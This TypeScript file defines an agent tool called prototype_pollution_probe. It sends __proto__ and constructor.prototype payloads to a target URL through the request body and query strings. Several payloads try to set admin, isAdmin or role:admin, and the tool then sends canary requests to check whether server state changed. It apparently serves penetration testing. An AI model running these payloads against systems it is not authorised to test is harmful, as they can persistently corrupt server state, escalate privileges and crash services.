import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'prototype_pollution_probe',
  description: 'JavaScript prototype pollution tester. Sends __proto__ and constructor.prototype payloads via POST body and query string params. Detects server-side state mutation via canary requests after each payload. Also detects direct reflection and server crashes.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url', type: 'string', required: true, description: 'Target URL' },
    { name: 'method', type: 'string', required: false, description: 'GET or POST', default: 'POST' },
    { name: 'auth_header', type: 'string', required: false, description: 'Authorization header value' },
    { name: 'base_body', type: 'string', required: false, description: 'JSON string of the normal request body — payloads will be merged into it' },
    { name: 'timeout_ms', type: 'number', required: false, description: 'Per-request timeout in ms', default: 8000 },
  ],
};

const SENTINEL = 'GENESIS_PROBE_TRUE';

interface PollutionProbe {
  type: 'body' | 'query';
  name: string;
  payload: Record<string, unknown> | string;
}

interface PollutionResult {
  type: 'body' | 'query';
  payload: string;
  status: number;
  length: number;
  reflected: boolean;
  caused_error: boolean;
}

interface CanaryResult {
  after_probe: string;
  canary_status: number;
  canary_length: number;
  differs_from_baseline: boolean;
}

async function sendBody(
  url: string,
  method: string,
  body: Record<string, unknown>,
  authHeader: string,
  timeoutMs: number,
): Promise<{ status: number; length: number; bodyText: string }> {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0',
  };
  if (authHeader) headers['Authorization'] = authHeader;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const resp = await fetch(url, {
      method,
      headers,
      body: JSON.stringify(body),
      signal: controller.signal,
    });
    clearTimeout(timer);
    const bodyText = await resp.text();
    return { status: resp.status, length: bodyText.length, bodyText };
  } catch {
    clearTimeout(timer);
    return { status: 0, length: 0, bodyText: '' };
  }
}

async function sendQuery(
  url: string,
  queryString: string,
  authHeader: string,
  timeoutMs: number,
): Promise<{ status: number; length: number; bodyText: string }> {
  const headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0' };
  if (authHeader) headers['Authorization'] = authHeader;

  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const fullUrl = url + (url.includes('?') ? '&' : '?') + queryString;
    const resp = await fetch(fullUrl, { headers, signal: controller.signal });
    clearTimeout(timer);
    const bodyText = await resp.text();
    return { status: resp.status, length: bodyText.length, bodyText };
  } catch {
    clearTimeout(timer);
    return { status: 0, length: 0, bodyText: '' };
  }
}

export const prototypePollutionProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const method = String(params.method || 'POST').toUpperCase();
    const authHeader = String(params.auth_header || '');
    const timeoutMs = Number(params.timeout_ms || 8000);

    let baseBody: Record<string, unknown> = {};
    if (params.base_body) {
      try {
        baseBody = JSON.parse(String(params.base_body));
      } catch {
        return { output: 'base_body must be valid JSON', parsed: { error: 'invalid base_body' } };
      }
    }

    // Baseline using clean body
    const baseline = await sendBody(url, method, baseBody, authHeader, timeoutMs);

    const bodyProbes: PollutionProbe[] = [
      { type: 'body', name: '__proto__ sentinel', payload: { ...baseBody, '__proto__': { 'polluted': SENTINEL } } },
      { type: 'body', name: 'constructor.prototype sentinel', payload: { ...baseBody, 'constructor': { 'prototype': { 'polluted': SENTINEL } } } },
      { type: 'body', name: 'nested __proto__', payload: { ...baseBody, 'a': { '__proto__': { 'polluted': SENTINEL } } } },
      { type: 'body', name: '__proto__ admin:true', payload: { ...baseBody, '__proto__': { 'admin': true } } },
      { type: 'body', name: '__proto__ isAdmin:true', payload: { ...baseBody, '__proto__': { 'isAdmin': true } } },
      { type: 'body', name: '__proto__ role:admin', payload: { ...baseBody, '__proto__': { 'role': 'admin' } } },
    ];

    const queryProbes: PollutionProbe[] = [
      { type: 'query', name: '?__proto__[polluted]', payload: `__proto__[polluted]=${SENTINEL}` },
      { type: 'query', name: '?constructor[prototype][polluted]', payload: `constructor[prototype][polluted]=${SENTINEL}` },
      { type: 'query', name: '?__proto__[admin]', payload: `__proto__[admin]=true` },
      { type: 'query', name: '?__proto__[isAdmin]', payload: `__proto__[isAdmin]=true` },
    ];

    const probeResults: PollutionResult[] = [];
    const canaryResults: CanaryResult[] = [];
    const vulnerableParameters: string[] = [];
    let confirmedPollution = false;

    // Test body probes
    for (const probe of bodyProbes) {
      const resp = await sendBody(url, method, probe.payload as Record<string, unknown>, authHeader, timeoutMs);
      const reflected = resp.bodyText.includes(SENTINEL);
      const causedError = resp.status >= 500;

      probeResults.push({
        type: 'body',
        payload: probe.name,
        status: resp.status,
        length: resp.length,
        reflected,
        caused_error: causedError,
      });

      if (reflected || causedError) vulnerableParameters.push(probe.name);

      // Send canary (clean baseline) to check for side-effects
      const canary = await sendBody(url, method, baseBody, authHeader, timeoutMs);
      const differs = canary.status !== baseline.status || Math.abs(canary.length - baseline.length) > 50;
      if (differs) {
        confirmedPollution = true;
        vulnerableParameters.push(`${probe.name} (side-effect confirmed)`);
      }
      canaryResults.push({
        after_probe: probe.name,
        canary_status: canary.status,
        canary_length: canary.length,
        differs_from_baseline: differs,
      });
    }

    // Test query probes
    for (const probe of queryProbes) {
      const resp = await sendQuery(url, String(probe.payload), authHeader, timeoutMs);
      const reflected = resp.bodyText.includes(SENTINEL);
      const causedError = resp.status >= 500;

      probeResults.push({
        type: 'query',
        payload: probe.name,
        status: resp.status,
        length: resp.length,
        reflected,
        caused_error: causedError,
      });

      if (reflected || causedError) vulnerableParameters.push(probe.name);

      // Canary for query probes
      const canary = await sendBody(url, method, baseBody, authHeader, timeoutMs);
      const differs = canary.status !== baseline.status || Math.abs(canary.length - baseline.length) > 50;
      if (differs) {
        confirmedPollution = true;
        vulnerableParameters.push(`${probe.name} (side-effect confirmed)`);
      }
      canaryResults.push({
        after_probe: probe.name,
        canary_status: canary.status,
        canary_length: canary.length,
        differs_from_baseline: differs,
      });
    }

    const hasReflection = probeResults.some(r => r.reflected);
    const hasCrash = probeResults.some(r => r.caused_error);

    const observations: string[] = [];
    if (confirmedPollution) observations.push('PROTOTYPE POLLUTION CONFIRMED: Server state changed after pollution payload — canary request returned different response');
    if (hasReflection) observations.push(`SENTINEL REFLECTED: "${SENTINEL}" appears in response — server processes __proto__ properties`);
    if (hasCrash) observations.push('SERVER CRASH: 500 error triggered by pollution payload — improper handling of prototype properties');
    if (observations.length === 0) observations.push('No prototype pollution detected — server handles __proto__ and constructor properties safely');

    const divider = '─'.repeat(80);
    const rows = probeResults.map(r =>
      `  [${r.type.padEnd(5)}] ${r.payload.padEnd(35)} | ${String(r.status).padEnd(4)} | Reflected: ${r.reflected ? 'YES' : 'no '} | Crash: ${r.caused_error ? 'YES' : 'no'}`
    ).join('\n');

    const output = [
      `Prototype Pollution Probe — ${url}`,
      divider,
      `Baseline: status=${baseline.status}, length=${baseline.length}`,
      divider,
      rows,
      divider,
      '',
      'CANARY SIDE-EFFECT ANALYSIS:',
      ...canaryResults.filter(c => c.differs_from_baseline).map(c => `  ⚠ After "${c.after_probe}": canary returned status=${c.canary_status}, length=${c.canary_length} (differs from baseline)`),
      ...(canaryResults.every(c => !c.differs_from_baseline) ? ['  No canary side-effects detected'] : []),
      '',
      'FINDINGS:',
      ...observations.map(o => `  ⚠ ${o}`),
    ].join('\n');

    return {
      output,
      parsed: {
        baseline: { status: baseline.status, length: baseline.length },
        probes: probeResults as unknown as Record<string, unknown>[],
        canary_results: canaryResults as unknown as Record<string, unknown>[],
        confirmed_pollution: confirmedPollution,
        vulnerable_parameters: [...new Set(vulnerableParameters)],
        observations,
      },
    };
  },
};
